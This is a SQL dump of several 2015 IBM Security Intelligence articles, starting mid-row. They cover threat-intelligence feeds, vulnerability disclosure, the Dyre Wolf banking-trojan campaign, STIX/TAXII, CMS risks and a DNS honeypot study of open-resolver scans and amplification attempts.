network traffic and IP addresses being used. You can then adapt your news sources, such as your Google alerts or Twitter lists, to look for new posts on this threat. When a new article is published, you are notified automatically and you can extract potential new threat information. This increases the quality of your information. Don’t forget that the alerts and advisories can also contain useful information to increase the quality of your threat information. The information you have now collected through these different articles serves as a starting point for giving advice to your customers for protection, detection and mitigation. You can share the details of the cyberattacks and the threat actors with your customers. It is also the central hub for pushing threat indicators so that your customers can use these to detect incidents in their environment. \n Getting and collecting all the threat information is great, but it is only beneficial if you can easily distribute it to your customers. You can share the information manually (or even semi-automatically with scripting), but that won’t scale well in the end. This is where the Trusted Automated Exchange of Indicator Information (TAXII), Cyber Observable Expression (CybOX) and Structured Threat Information Expression (STIX) come in. They are a   that help with the automated exchange of cyberthreat information. The combination of STIX and TAXII allow you to more easily share threat information with your constituency and peers. If you are considering purchasing new security devices, one of the key questions you should ask is, “Does it speak STIX?” If not, it’s going to be harder to integrate them later on in an environment where you automatically push threat information. For existing equipment and software, you might want to look for tools that facilitate TAXII/STIX integration, such as the   to import data from STIX and/or TAXII repositories into  . One of the more easy-to-use platforms for sharing threat intelligence is the  . It does not yet have full integration of STIX or TAXII. The Web interface and collaborative features allow you to get quick, valuable feedback from your customers. You can partially automate feeding your threat intelligence platform. Once you have compiled the details of a new threat from one or more news sources, you can either manually extract the indicator information or use tools to do this. For example, with  , you can extract indicators of compromise from PDF files. Ideally, you combine this tool with a copy of the repository of PDFs listed by the APTnotes GitHub repository. So how do you collect all this information? Manually visiting the news sites daily and checking for updates is not feasible. Luckily, there’s technology for that: RSS. RSS is a family of standard Web feed formats to track published content. It allows publishers to easily syndicate content. Most if not all the content sources above have an RSS or atom feed. It is an accessible format you can use as the central technology for collecting all the information. The way you access RSS feeds depends entirely on your personal preference. You can take full control and host the service yourself ( ) or use an external provider ( ). Note that you can easily share your list of RSS feeds via OPML, an XML format for exchanging lists of Web feeds (see   and   for working example files). Once you have your feeds set up, you have to come up with a workflow on how to process them. As an example, this is a summary of the workflow I use: The news is read via  . Articles that require immediate attention are forwarded for operational use. Other articles that are interesting, either for trends (starred articles) or threat intelligence ( ), are stored for intelligence sharing. Tweets are read via the normal Twitter feed and via Twitter lists based on the type of tweeter, whether vendor, product or news. Interesting tweets are sent to operational use or intelligence sharing via Evernote. The tweets are also stored in Elasticsearch via   and processed similarly as with the normal Twitter feed. The data stored in Elasticsearch allows a graphical representation of topics (with Kibana) that were the most tweeted. You can also sort tweets by language, country and by which links have been tweeted most, which might be a good indication of an interesting article.', '\'Cybersecurity\', \'IBM Security QRadar\', \'Security Information and Event Management (SIEM)\', \'Security Intelligence\', \'Security Trends\', \'Threat Intelligence\'', 'https://securityintelligence.com/how-to-stay-up-to-date-on-security-trends/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (438, 'Determining the Responsibility of a Vulnerability Disclosure', 'Peter Allor', '2015-4-6', 'There are currently ongoing discussions about   and what is right, what is responsible and who has the interest of securing the Internet from the evils of bad coding or software design. Much of this is a good discussion, while some of it is a rehash of old arguments. The last seminal work on disclosures was performed by the National Infrastructure Advisory Council (NIAC), which published the “Vulnerability Disclosure Guidelines” back in 2004. I had the opportunity to contribute to these efforts. However, a lot has happened over the past decade in IT, so this discussion is probably worth revisiting — and overdue.\n What have we learned over time? What is out of date? These questions are now part of the discussion. I can say that we have moved from a responsible disclosure to a coordinated disclosure thought process, but we have not yet documented such an approach. The moniker of being “responsible” seemingly indicates that only one method is responsible. If everyone else has different approaches, does that mean they are irresponsible? I should say not. As we know in IT, there are many paths one can take to solve an issue, and a vulnerability disclosure is not wholly different here.\n So what have we learned over the past decade to change that? Essentially, one must coordinate a   with others. In other words, there is no one set or correct path for all to follow — especially not rigidly. We are all situation-dependent, which brings us to the bilateral issue. In the NIAC approach, we essentially looked at a situation as being between two parties. If one party did not know the other or there was a lack trust, we invoked a coordinator to assist us through the process, such as the Computer Emergency Response Team Coordination Center or the Computer Security Incident Response Team to do that for us. Occasionally, it would involve two or three vendors and a researcher, as the intermediary became the trusted communicator and coordinator. It worked for the most part. They had the inside line on what was ground truth and knew the parties involved.\n First, we have more parties that have to fix vulnerable conditions. Second, we have built and now use more complex applications. So far, there has been no real change, so there’s no real problem, right? However, then some other things came along. We have applications that run entirely on one platform and are delivered centrally. All that is controlled is updated almost simultaneously. However, we also have another set of conditions. Enterprises now take major applications and add their own code on top of that. In other words, there are major differences in what is deployed from one organization to another, and we haven’t even touched on the international aspect. Furthermore, we have now embedded third-party software — you know, all those special calls and other interfaces that allow communications across applications and platforms. We have seen quite a few large-scale issues this past year with this problem.\n This brings us back to the recent set of discussions about disclosures. We now have multiparty, multifaceted coordination needs. These are cross-industry requirements, which means we need to now consider phasing our disclosures. This requires us to open the genie box and reconsider our approach in a more organized manner. No longer can a researcher jump out and save the Internet from itself, since its complexity is beyond that stage. A researcher may understand the bug, but the system of systems and the interactions require a broader  .\n By the way, “organization” does not refer to government-run and coordinated organizations, although they certainly have an aspect to play — just not a central role. This is a group effort that requires thought-out discussions and consideration. I applaud the efforts of all who are part of the discussion — especially the Forum for Incident Response and Security Teams and the Industry Consortium for Advancement of Security on the Internet for lending a hand to convene the discussion. How far we get depends on how much effort we put into this. However, keep in mind that the Internet now has a lot of business that crosses through it, and we need to consider that while we protect everyone.', '\'Cybersecurity\', \'Information Sharing\', \'Responsible Disclosure\', \'US-CERT\', \'Vulnerability\'', 'https://securityintelligence.com/determining-the-responsibility-of-a-vulnerability-disclosure/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (439, 'The Dyre Wolf Campaign: Stealing Millions and Hungry for More', 'John Kuhn', '2015-4-2', 'IBM Security has identified an active campaign using a variant of   that has successfully stolen more than $1 million from targeted enterprise organizations. The campaign, named “The Dyre Wolf” by IBM Security researchers, shows a brazen twist from the once-simple Dyre malware by adding sophisticated social engineering tactics likely to circumvent  . In recent incidents, organizations have lost between $500,000 and $1.5 million to attackers. While many popular banking Trojans have targeted individuals, Dyre has always been used to target organizations. Since its start in 2014, Dyre has evolved to become simultaneously sophisticated and easy to use, enabling cybercriminals to go for the bigger payout. In October 2014, the IBM Trusteer team reported a huge increase in the infection rate of the Dyre malware, from 500 instances to nearly 3,500. There seems to be a direct relationship between the development advancements within the Dyre project and this uptick. From Dyre’s very early days, its authors included a mechanism that allows for spreading malware spam through a mass mailing of victims’ contacts lists. This methodology has always proven effective for malware authors, and Dyre takes advantage of it with dramatic results. What do the dire wolf, the wolf in sheep’s clothing and “The Wolf of Wall Street” have in common? Deception and a ferocious appetite to get what they want. The Dyre Wolf campaign is no different. From an initial infection via the Upatre malware through a spear-phishing email to a distributed denial-of-service (DDoS) attack, the criminals carrying out this latest string of attacks are using numerous sophisticated techniques. However,   and the resulting banking credentials theft is the focus of this new campaign and is ultimately what is used to illicitly transfer money from victims’ accounts. An experienced and resource-backed cybercrime gang operates Dyre. It was used in wide-stroke attacks for the past year and has now moved into a more brazen stage of attacking corporate accounts via the incorporation of skilled social engineering schemes. What does this mean? As we continue to see, cybercriminals grow in resourcefulness and productivity at alarming rates. They are sharing expertise on a global scale via the   and launching carefully planned, long-term attacks to attain the highest return on investment. In this campaign, the attackers are several steps ahead of everyone. Even while casting a wide net to reel in victims via spear-phishing campaigns, these attackers are targeting organizations that frequently conduct wire transfers with large sums of money. While there’s no easy way to know which companies do large wire transfers, it’s a very interesting coincidence. It’s also important to note that the majority of antivirus tools frequently used as an organization’s first line of defense did not detect this malware. Once the infected victim tries to log in to one of the hundreds of bank websites for which Dyre is programmed to monitor, a new screen will appear instead of the corporate banking site. The page will explain the site is experiencing issues and that the victim should call the number provided to get help logging in. One of the many interesting things with this campaign is that the attackers are bold enough to use the same phone number for each website and know when victims will call and which bank to answer as. This all results in successfully duping their victims into providing their organizations’ banking credentials. As soon as the victim hangs up the phone, the wire transfer is complete. The money starts its journey and bounces from foreign bank to foreign bank to circumvent detection by the bank and law enforcement. One organization targeted with the campaign also experienced a DDoS. IBM assumes this was to distract it from finding the wire transfer until it was too late. This campaign highlights the fact that organizations are only as strong as their weakest link, and in this case, it’s their employees.   indicated 95 percent of all attacks involved some type of  . These attackers rely on that factor so someone will open a suspicious attachment or link and they can successfully steal millions. IBM Security recommends organizations follow these security best practices:', '\'Banking\', \'Banking Trojan\', \'Dyre\', \'Dyre Wolf\', \'Malware\', \'Phishing\', \'Social Engineering\', \'Spear Phishing\', \'targeted attack\', \'Trojan\'', 'https://securityintelligence.com/dyre-wolf/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (440, 'The Power of Community Defense: Using a Combination of Threat Intelligence, Information Sharing and Open Standards', 'Sandy Bird', '2015-4-1', 'As seen in the media on a regular basis, organizations are being breached in a variety of ways, and the sophistication of attacks ranges from basic to truly mind-bending. The simplest of these breaches are executed using methods organizations have known how to protect against for years, yet they still fail to deploy the proper countermeasures. With these much more intricate attacks, companies still would have been at risk, even with the best prevention methods in place. However, by banding together and implementing a community defense to share information, organizations can achieve a number of important goals, such as detecting attacks at an early stage with a  , helping to reduce catastrophic events, providing insight on security risks and alerting others about which threats to secure against. According to the latest  , vulnerability disclosures rocketed to a record high in 2014, and designer vulnerabilities such as Heartbleed and Shellshock revealed cracks in the foundation of underlying libraries on nearly every common  . Learning where your organization stands on the community defense curve and figuring out how to best leverage information sharing for your business needs should be a top security priority. The following are a few things to consider: The next few years should be very interesting as defenders join forces to share security knowledge for the safety of their organization, customers and peers. What will the future hold for those who actively engage in information sharing and community defense? Community defense best practices and strategies will be discussed in detail during a two-hour,   sponsored by the Financial Services Information Sharing and Analysis Center and Soltra at  . Security community panelists and peers will address how to practice information sharing across industries and geographies, how to make threat intelligence actionable, the economics involved and how   such as the Structured Threat Information Expression (STIX) and Trusted Automated Exchange of Indicator Information (TAXII) will be used.', '\'Cybersecurity\', \'Data Breach\', \'IBM X-Force Research\', \'Information Sharing\', \'RSA Conference 2015\', \'Security Intelligence\', \'Threat Intelligence\', \'Vulnerability\'', 'https://securityintelligence.com/the-power-of-community-defense-using-a-combination-of-threat-intelligence-information-sharing-and-open-standards/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (441, 'How STIX, TAXII and CybOX Can Help With Standardizing Threat Information', 'Koen Van Impe', '2015-3-26', 'The security threat and intelligence landscape is evolving faster than ever before thanks to more and more  , capable and motivated adversaries. For example, the various entities powering  ,   and   had no lack of resources and motivation to pursue their goals. To keep up with these increasingly complex attacks, we have to focus our attention on actions at an earlier phase of the cyberattack life cycle and create a common ground for standardizing threat information. Instead of focusing on the response aspect, we have to push as much as possible toward early detection and prevention — ideally before the exploit phase happens. For incidents to be mitigated or dealt with by your team, they must first be detected, preferably as early in the attack phase as possible. This can be illustrated with the different phases of a cyberattack, loosely inspired by the different phases of a penetration test: Up until now, the bulk of the action happens after the exploit — that is, after the attackers have already gained access and can do their thing. Incident response and cleaning up is a resource-intensive task, and all the attackers need to keep their foothold is one entry point that is overlooked. However, what if we could respond   the offensive part of the attack begins? Faster detection and prevention demands more intelligent, automatic and fluent sharing of threat intelligence. Ideally, you should strive for sharing when something happens, at wire speed. Sharing and improving security through   is nothing new, but it is typically focused on manual interactions, with little to no contextual information. The way we share information and what we share should increase our knowledge of the adversaries and which assets they are after. This can only happen if we get information from a wide range of players from different fields. No single participant can detect all relevant information. The problem is not that people don’t want to share, but that the sharing process takes time and resources, and there is no real benefit for the people sharing the information. Participants are often willing to share information on incidents that directly affect them, but something that only matters to a third party earns a lower priority. You also have to define what you would like to share before an incident occurs. It is important to agree on standardizing threat information. Defining the content, topic fields and items you want to share when the incident takes place is bound to causes errors due to an increased stress level. This is where the Trusted Automated Exchange of Indicator Information (TAXII), Cyber Observable Expression (CybOX) and Structured Threat Information Expression (STIX) come in. They are an open community-driven effort and a set of free, available specifications that help with the automated exchange of cyberthreat information. This allows cyberthreat information to be represented in a standardized format. They are not pieces of software themselves, but rather standards that software can use. The combination of STIX and TAXII allow you to more easily share threat information with your constituency and peers. TAXII is not an information sharing program and does not define trust agreements. Rather, it is a set of specifications for exchanging cyberthreat information to help organizations share information with their partners. TAXII has the following three sharing models: TAXII defines the following four services, where each service is optional and services can be combined in different ways for different sharing models: There is a Python library “libtaxii” and a proof-of-concept TAXII server called “Yeti.” Everything that is being done for TAXII is published on GitHub. Currently, TAXII defines XML messages over HTTP(S), but the design allows for other possibilities. CybOX provides a common structure for representing cyber observables across and among the operational areas of enterprise cybersecurity. Cyber observables can be dynamic events or stateful properties. CybOX objects can be an email message that is received from a specific address, a network connection that is established toward a specific address, the MD5 hash of a file, a process, a URI or the modification of a registry key. CybOX can be used for threat assessment, log management, malware characterization, indicator sharing and incident response. STIX is a language for having a standardized communication for the representation of cyberthreat information. Similar to TAXII, it is not a sharing program or tool, but rather a component that supports programs or tools. The STIX language has a number of constructs or components, including the following: One of the things that sometimes causes confusion with STIX constructs is whether to use incident or indicator. If you are aiming to provide a history for further analysis or follow-up, you have to use an incident construct. If you want to build a list of items to look for, use an indicator construct. An oversimplification of gluing this all together is that STIX is a language that can use CybOX words, and the communication is possible with TAXII. STIX characterizes what is being told, while TAXII defines how the STIX language is shared. Understanding the different STIX elements is easier if you use them in an example. Consider the following 10 steps in a computer security incident taking place in a government agency: This example shows practical use for sharing, detecting and warning. It also shows how STIX relationships are one of the features that make it powerful. Instead of having isolated information, you can use STIX to relate them together, enabling a more contextual understanding of the threat. Visualization makes information more accessible. With the help of the tool  , you can get a visual representation of STIX documents as a node-link tree, with the root at the top of the XML structure: The samples on the   are a good start for mapping real-world threat reports. The STIX project provides a   for parsing, manipulating and generating STIX content. If you are using a  , you can   from STIX and/or TAXII repositories. MITRE provides a number of excellent online resources to get more information on the details of TAXII, STIX and CybOX, including  ,   and  . By using TAXII, STIX and CybOX, you make it easier and faster to share information you find with your users and peers. It allows an entire community to add to and extend the context of threat information and threat intelligence. These projects are an important part of gathering news and information feeds, centralizing these feeds and adding different contextual information. It allows you to give your peers a “what’s going on” feed and delivers important threat warnings and incident information early on.', '\'Cybersecurity\', \'CybOX\', \'Information Sharing\', \'Malware\', \'Security Intelligence\', \'STIX\', \'TAXII\', \'Vulnerabilities\'', 'https://securityintelligence.com/how-stix-taxii-and-cybox-can-help-with-standardizing-threat-information/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (442, 'Made for Headlines: Do Designer Vulnerabilities Compromise Security?', 'Pamela Cobb', '2015-3-25', 'We have come to a precarious place in security research where the volume of vulnerability disclosures is making it difficult to prioritize not just what to patch first, but also what to prepare for that nerve-wracking five-minute elevator trip with the CEO, who undoubtedly heard about the latest Heartbleed over his or her morning coffee. In the age of   that come with catchy names, branded websites and custom logos, how can the security industry stop itself from falling into a trap where the marketing of security vulnerabilities is just as important, if not more so, than the risk they actually represent?\n Allow me to put on my Captain Obvious hat when I say that naming things makes them easy to identify. How easy is it to reference a “blue pen” versus a “000F55-colored ink-based writing instrument?” Perhaps I have 10 pens in my desk drawer. If all of them have the same blue color, I need a secondary indicator. If I number the pens in my drawer in order of discovery, I’d get PEN-2015-0001 and so on. These schemata are very handy.\n Naming or numbering something, however, doesn’t necessarily brand it. Branding implies the development of surrounding assets, such as websites, pictures, blogs, tweets and webinars. The creation of these assets can help provide additional information and context, which is helpful to have in one place when you’re talking about it.\n In the past, the industry has given threats names such as “Melissa” and “I Love You,” or given worms names like “Conficker” and “Blaster.” These names helped raise awareness at a time when Internet threats were in their infancy, and the public was unaware of the potential dangers of opening email attachments. Threats have evolved, and the recent change in naming vulnerabilities seems to be that we are now seeing bundled packages of accessories at the moment of  , not just a suggested name.\n The naming trend for malware waned for a while, likely in response to a customer revolt over these slickly named bits of code. Malware naming fatigue set in, in the same way the massive number of personally identifiable information records breached today has dulled consumers’ response to a ho-hum sigh of resentment. Security analysts are beginning to note a new vulnerability marketing release by just adding it to the pile of things they need to address in their networks.\n Security is a competitive market, and technologies rapidly change. The ability to claim discovery of a critical vulnerability is a feather in the cap of any security researcher. With the decline of bug bounty programs, notoriety is one of the benefits a researcher can claim these days, along with the satisfaction of foiling the attackers. Coordinating disclosures between researchers and software vendors is tricky and requires careful planning to maximize protection for the end user. There is an intricate dance of discussion, patch development, testing, rollout and public disclosure that finds equilibrium in the need to raise awareness for end users without raising too much awareness about potential bad actors.\n However, the industry needs to balance the desire for media opportunities with potential delays in disclosure if the marketing materials for the vulnerability aren’t ready. Several detailed accounts of the timeline around Heartbleed indicate there was a rush to create marketing materials for the vulnerability. The fear, of course, is that security researchers will focus more on bragging rights than actually protecting end users, which could lead to delays in disclosure if resources are diverted from responsible disclosure to marketing activities.\n Designer vulnerabilities do nothing to offer better protection for the customer’s ecosystem than one marked only with a CVE number.   reported that three months after the   vulnerability disclosure and associated patches were made available, 59 percent of banking apps were still unpatched. Knowing the name “ ” didn’t increase the patch rate, either — those were only slightly different than the Cordova instance, with just over half of affected servers patched two months after disclosure.\n While naming and branding can smooth the lines of print and digital communication, it can distract from truly fixing problems in the network if resources are directed toward the biggest brands versus the biggest holes in the infrastructure.\n By perusing message boards where security analysts and researchers talk, there is clearly a growing distaste for overmarketed designer vulnerability disclosures. The highest recommendation X-Force can provide is to have current and accurate asset inventory for your ecosystem and prioritize patching based on risk impact to critical systems, not on which vulnerabilities have the most attractive logo.', '\'Apache Cordova\', \'Cybersecurity\', \'Heartbleed\', \'IBM X-Force Research\', \'Malware\', \'Responsible Disclosure\', \'Vulnerability\'', 'https://securityintelligence.com/made-for-headlines-do-designer-vulnerabilities-compromise-security/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (443, 'Security Snowflakes: Interactive IBM X-Force Feature Visualizes Data Breach Records', 'Jason Kravitz', '2015-3-19', 'Security incidents are like snowflakes. Individually, each is a unique variation of a set of repeating patterns, yet over time, they tend to pile up into an unruly mound of a billion or more leaked records of personal data. Given the pervasive effects of a data breach, there are many public resources that do a great job tracking and advising on these numerous security incidents, although it is not always easy to see at a glance what is going on. Over the years, IBM X-Force has reported on a sampling of   to understand trends and key events. In 2011, in the midst of frequent reports of data leaks, denial-of-service (DoS) attacks and social hacktivism, X-Force declared 2011 the “Year of the Security Breach.” Since that time, we have maintained the security incident bubble chart, a data visualization that provides a graphical representation of security incident activity. Until now, this has been a static look for the given period and is only updated once or twice a year. This week, IBM X-Force launched an   of this visualization that provides an up-to-date overview of security incidents and a way to filter data based on disclosed attack types, affected industries, financial impact and geography. When presented with this kind of information, common questions include, “How many security incidents were reported in the past year?” and, “Have there been more security incidents this year than any previous year?” Though we have been asked these questions often over the four years since IBM X-Force has tracked data breaches and security incidents, the answer is not so straightforward. It is helpful to consider how security incidents are uncovered and reported. There are generally four primary methods: firsthand knowledge, mandated disclosure, secondhand knowledge and public disclosure. Security vendors, managed security services providers and companies that provide emergency response services are often informed about security incidents that don’t make headlines. These are the people tasked with collecting forensic data, mitigating future exposure and often fixing the problems that led to the data breach in the first place. Depending on the scope of the incident, these don’t always get covered by the media, and unless ordered by law, they may not be disclosed publicly. Users may individually discover a security incident if they detect suspicious activity of an online account or are unable to access an online service, as is the case in a DoS attack. Due to privacy laws in many countries, companies that have discovered the potential loss of data or private information are required to inform their customers. This is particularly true for health care providers and other industries where personally identifiable information (PII) is collected. The severity and impact of these incidents may vary, though. If a USB drive with PII goes missing, it does not automatically mean the information will be used for malicious purposes. In that respect, the full number of these incidents adds to the total but may not indicate increased criminal intent. The effects of a security incident can sometimes become apparent over time, as is the case with the rise of   in the United States in the past few years. Credit card providers notice an increase in fraudulent activity and can determine whether there is a common merchant connected with the card numbers. In this case, the disclosure becomes public as customers are informed or more details of the data breach are released. As demonstrated by several high-profile incidents over the past year, data stolen from a company can be posted publicly. This might include a user table dump from a website with email addresses and passwords that are often weakly encrypted or in plaintext, or a full dump of intellectual capital, email messages and other sensitive documents. There are many anonymous websites on which attackers can post this type of information and then inform the world through public platforms such as social media. Given that the information is coming from the attackers, the authenticity of the data can be questionable. Cybercriminals who want to make a name for themselves could post old credentials from previous data breaches to falsely represent a new incident. Given the diversity and volume of incidents coming from these various sources, it can be challenging to comprehensively track all security incidents, let alone determine their severity and root cause or find other detailed information. Additionally, every country has different disclosure laws, which makes it difficult to collect incident statistics on a global scale. Some security vendors produce anonymous reports from firsthand knowledge that give insights into what would otherwise be private information. Additionally, there are several excellent online data loss resources that actively track mandated disclosures, as well as services that comb through public disclosures and dumps to determine whether a given email address has been involved in an incident. Each of these organizations tracks pieces of the bigger picture, and their data can help analyze trends in increased or decreased volume. However, this still makes it difficult to answer the question of how many incidents occurred this year. For the interactive security incident visualization, it is worth noting that the total incidents   tracks are less than the total number of all incidents in any given year. While the data represents a variety of incidents and targets, there are some minimum requirements. By excluding unverified dumps from unknown sources and smaller incidents, we can provide a representative sampling of several prominent incidents at a given time but not claim to be a fully comprehensive resource. By visualizing how security incidents have evolved over time and immersing ourselves in the unique, snowflake-like patterns found within each incident, we can better understand how to better prepare ourselves for future risk awareness and the subsequent actions that help us implement more effective security fundamentals.', '\'Data Breach\', \'Data Security\', \'IBM X-Force Research\', \'Security Breach\', \'X-Force\'', 'https://securityintelligence.com/interactive-ibm-xforce-feature-visualizes-data-breach-records/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (444, 'Pressing Your Luck With WordPress? A Look at CMS Security Risks', 'Michelle Alvarez', '2015-3-18', 'When my colleague,  , isn’t jamming on his drums in one of the many bands he rocks out with, he is telling you about the security concerns regarding content management systems (CMS) in his recent  . Businesses leverage these systems to address the need for quick changes to Web content, while cybercriminals leverage their popularity by targeting unpatched installations. The three big CMS platforms that are widely used today are WordPress, Joomla and Drupal.   have evolved significantly over the past decade and a half, and today, they are rich in both features and vulnerabilities. These products are built on open-source frameworks within shared developer environments just like Linux, Apache and Open Office. Built within them are third-party themes and plugins designed by thousands of authors. Needless to say, CMS platforms are not security-hardened to a great degree out of the box. If I were an attacker targeting a vulnerable CMS, I would say, “Easy peasy, lemon squeezy.” Lemons are sour-tasting — much like the feeling after you’ve been compromised. Attackers have many ways to target vulnerable CMS installations. For one, website operators who use   leave their administrator accounts vulnerable to brute-force attacks. Obtaining access to an administrator account can lead to the distribution of malware. CMS platforms are also not immune to distributed denial-of-service (DDoS) attacks. In 2014, more than 162,000   were leveraged, creating a super DDoS net that focused on one website and took it down. With thousands of developers who design CMS themes and plugins for custom use, they are a popular target for cybercriminals. In 2013, a study from security vendor   found that nearly 20 percent of the 50 most popular plugins for the WordPress platform are vulnerable to common Web attacks. Finally, attackers love a good SQL injection or cross-site scripting attack. A simple Google search reveals hundreds of known attack parameters available that affect  . Looking at the data for 2014, IBM found that many SQL injection and command injection attacks were specifically targeting WordPress. These WordPress installations were attacked heavily during the first three months of 2014. The pattern then diminishes from April through September, where it then briefly resurges in October. The retail trade industry was the most attacked industry on WordPress, and nearly half of the attacks originated in the United States. \n No. However, it is important to realize that there are several processes that should be implemented if you’re using one of these platforms in your environment, such as the following: After applying these recommendations, you will have a greater peace of mind regarding the security of your CMS.', '\'Content Management System (CMS)\', \'Drupal\', \'Malware\', \'SQL Injection\', \'WordPress\'', 'https://securityintelligence.com/pressing-your-luck-with-wordpress-a-look-at-cms-security-risks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (445, 'Analyzing Queries on a Honeypot Name Server for Better DNS Log Quality', 'Koen Van Impe', '2015-3-16', 'Honeypots are an easy and popular way to get statistics on the “Internet noise.” Getting more knowledge on Internet noise gives you more insight into what is out there and is one of the sources that helps in getting  . I was curious what kind of traffic a honeypot name server receives in a public cloud; my research follows.\n The machine was a default Ubuntu 14.04.1 LTS placed in the Frankfurt EC Amazon cloud. It had one IPv4 address configured (I did not look at IPv6 data). Neither the IP address nor the Domain Name Server (DNS) service was published on any public channels. Any request coming in can be considered suspicious. I have not looked into the effects of   of cloud providers.\n The server also had a number of other honeypots: dionaea,  ,  , SNMP, NTP and  . Kippo is a SSH honeypot that can   and improve security. The setup and data gathering (via ELK) is available via a repository at  .\n I used one of the most popular  ,  , with a fairly default setup. Recursion, IPv6 and forwarders were disabled, logging was enabled, a custom server version number was set and the server had one zone file. A zone file is a file that describes what mappings of IP addresses and hosts/domain names are available in a subdomain. This zone file contains one record that points to the same host. So, anyone querying the honeypot name server will get a reply with the IP address of the honeypot server (“a.b.c.d”).\n The first set of statistics represents the findings of the raw data from the log file.\n If we map the queries based on the date, we can observe a spike between Jan. 15 and Jan. 20 and then a number of spikes along the end of January and beginning of February.\n \n Further investigation of these spikes show us that they are caused by a single IP belonging to Ruhr-Universität Bochum in Germany, which has a website explaining the  . It uses the obtained scan data to warn network owners of possible problems. Two IP addresses were seen doing these scans: one from Ruhr-Universität Bochum and one from Universität des Saarlandes, also in Germany.\n We’ll observe later that a lot of the queries were systems scanning for  .\n I extracted the IPs from the logs and then used the IP to the autonomous system number (ASN) mapping service of   to get the country and ASN data. An  , tells us to what network block the IP address belongs. The script can also be found on  .\n \n \n The majority of the scans came from Germany, the U.S. and China. The AS of   (Germany) and Chinanet-Hunan caused the bulk of the queries. More than half of the queries originate from Europe (RIPE). These results are not surprising considering the large set of requests coming from the Ruhr-Universität Bochum.\n \n Most of the request types were DNS queries for an A record. More than 18 percent of the queries were for ANY records. The TXT requests were mostly intended to retrieve the DNS server version.\n \n The queries asked for records of Google, Shadowserver or the version of the Bind name server. It is not much of a surprise that the most popular   are .com and .org. A   and TLD are something you should consider when setting up your business. More interesting in this data are the presence of .ru and .cn TLDs.\n \n \n As mentioned above, a lot of the requests were done by scans for open resolvers. As a matter of fact, around 56 percent of the queries came from organizations that are scanning for open resolvers.\n \n That is a lot, but they are fairly easy to spot in the logs:\n The high amount of probes for open resolvers can be annoying and a real log polluter. If you do not filter these requests from entering your log monitoring system, it will be hard to spot abuse. Applying the proper filters to remove the Internet noise before processing the logs, blocking their requests or asking them nicely to stop scanning you is one of the things you’ll absolutely have to do if you want to keep an eye on your DNS infrastructure. It will also greatly increase the results you get from your log-monitoring or  .\n There might also be a legal issues with this scanning. Most of the queries for open resolvers are done with good intent, but it’s not difficult to imagine that someone who’s not familiar with these organizations consider these scans to be malicious. Andrew Cormack covers some of the legal issues in his paper “ “.\n The results below are the logged queries without the open resolver scans:\n \n There’s no real noticeable spike in time. Most of the queries originate from the U.S. and China. The queries are equally spread amongst the RIRs Ripe, Arin and Apnic.\n \n The request types in this category are either queries for an A record or the ANY resources. Most queries were for the Google domain.\n \n \n Having the data sets without the open resolver hosts also reveals the behavior of two particular hosts: one from China (AS 63835) and one from Russia (AS 2848).\n The Chinese host does regular queries for the Bind server version and then looks up the A record of www.google.it and www.google.com:\n The Russian host does only regular queries for com:\n About half of the requests were an “ANY” request.\n Typically, this is an attempt for a   with  . All of these queries had the recursive () flag set, indicating it comes from a client or a server that is forwarding the queries. A very small number of hosts requested () to have DNSSEC support in the reply.\n Besides the Google and ISC domains, we also observe some more “exotic” domains that were used to at least test for DNS amplification attack possibilities. These domains were all already observed as being used for attacks:\n  has an overview of the domains used in attacks, and it provides an   to blacklist these domains.\n So, why would anyone use these requests? There’s no particular reason for sending these requests in normal Internet behavior. It becomes more obvious if you look at the replies you get for some of the queried domains. You can test this yourself with:\n Some of the replies exceeded sizes of 6,000 bytes.\n For regular use (except for the example for zone transfers), DNS uses the UDP protocol on port 53. DNS packets are almost always relatively small in size (512 bytes, not considering different headers). Note that DNSSEC often requires larger packets. DNS can handle larger packets via the use of   while sticking to UDP. There’s still a limit of the packet size with EDNS0 (maybe because the server simply does not support EDNS0), and then these large packets have the DNS request fallback to TCP. The output of dig shows this with:\n In summary: You have a small request over a simple protocol that requires few resources turned into a large reply on a more complex protocol that requires substantially more resources.\n One of the differences between UDP and TCP is that with UDP, there is no handshake. You send the request and you forget about it; it is a “stateless” protocol. With TCP, there is a handshake that requires substantially more computer resources. Additionally, it is also fairly easy to   the source IP address.\n Combining these two makes a great attack vector for conducting an amplification attack against specific targets.\n The folks at   have described how these DNS amplification attacks work. The same patterns have been observed by  .\n Protection against these types of attacks requires a multilayered approach. DNS administrators should ensure that their recursive name servers are not open resolvers by limiting the list of clients that can do a recursive query. For authoritative name servers you should implement response rate limiting  . Network administrators can help by only allowing known network prefixes to leave their network (implementing  ). This helps fight all UDP based DDoS amplification attacks (DNS, SNMP, NTP, etc.).\n A random DNS server quickly receives a lot of queries for open resolver tests. This internet noise will polute the logs, which makes it harder for you to detect attacks on your DNS infrastructrue.\n A honeypot DNS server is one of the tools that allows you to capture this Internet noise.\n With the use of a few scripts, you can easily filter out the top scanners from the honeypot dataset. You can then use this white list to filter them from your real DNS logs and put more value in your log-monitoring or  . Some kind of manual verification of the white list is still necessary, though, to prevent genuine attackers from ending up on your white list.', '\'Domain Name Server (DNS)\', \'Honeypot\', \'IPv4\', \'Security Information and Event Management (SIEM)\'', 'https://securityintelligence.com/analyzing-queries-on-a-honeypot-name-server-for-better-dns-log-quality/');
